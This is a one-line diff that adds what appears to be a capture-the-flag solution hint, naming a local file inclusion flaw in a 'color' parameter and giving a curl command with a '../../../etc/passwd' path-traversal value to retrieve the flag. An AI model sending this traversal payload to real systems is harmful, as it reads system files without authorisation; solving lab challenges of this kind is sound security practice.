@@ -1,0 +1,1 @@
+its a local file inclusion use the color parameter and the etc/passwd to get the flag , curl -v '[DOMAIN]?color=../../../etc/passwd'
